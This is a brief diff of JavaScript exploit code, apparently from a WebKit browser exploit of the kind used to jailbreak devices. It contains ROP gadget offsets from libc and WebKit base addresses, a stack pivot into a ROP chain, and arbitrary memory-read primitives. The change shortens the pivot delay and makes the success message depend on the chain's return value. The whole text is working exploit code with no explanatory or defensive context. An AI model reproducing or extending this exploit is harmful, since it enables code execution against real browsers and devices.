@@ -11401,13 +11401,15 @@ libc_base+248252,libc_base+50775,libc_base+793877,ropchain+219976,webkit_base+74
 ]);
 db([0,0]); 
 db([5,0,0,0,0,0]);
-window.msgs.innerHTML="<h1 style='font-size:25px;color:green;text-align:center;'>"+LoadedMSG+"</h1>";
 setTimeout(function(){
 pivot(ropchain);
-},500);
+},100);
 var main_ret = read_ptr_at(main_ret);
 var printf_buf_end = read_ptr_at(ropchain+printf_buf_offset);
 var printf_ans = read_mem_as_string(printf_buf, printf_buf_end-printf_buf);
 var _ = malloc_nogc.pop();
 var _ = malloc_nogc.pop();
 var _ = malloc_nogc.pop();
+if(main_ret==179|| main_ret==0){
+window.msgs.innerHTML="<h1 style='font-size:25px;color:green;text-align:center;'>"+LoadedMSG+"</h1>";
+}
